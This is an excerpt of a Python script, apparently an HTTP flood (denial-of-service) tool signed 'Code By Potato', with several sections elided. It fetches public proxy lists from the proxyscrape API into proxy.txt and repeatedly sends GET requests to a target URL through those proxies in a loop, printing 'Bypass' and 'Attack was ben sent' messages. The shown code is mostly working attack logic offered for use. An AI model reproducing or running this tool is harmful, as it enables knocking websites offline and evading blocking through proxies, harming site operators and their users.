...
def main():
	...
	if ge =='y':
		if ssl == 'y':
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=yes&timeout=2000') #Code By Potato
			with open('proxy.txt','wb') as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "Attack was ben sent")
		else:
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=all&timeout=1000') #Code By Potato
			with open('proxy.txt','wb') as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "Attack was ben sent")
	else:
		...
		while oo:
			try:
				...
				try:
					for g in range(per):
						s.get(url)
						print(Fore.CYAN + "Bypass -> " + Fore.WHITE + str(url)+Fore.CYAN + " From~# " +Fore.WHITE + str(proxy[0])+":"+str(proxy[1])) #code By Potato
					s.close()
				except:
					s.close()
			except:
				s.close()
				print(Fore.RED + " Attack was ben sent")
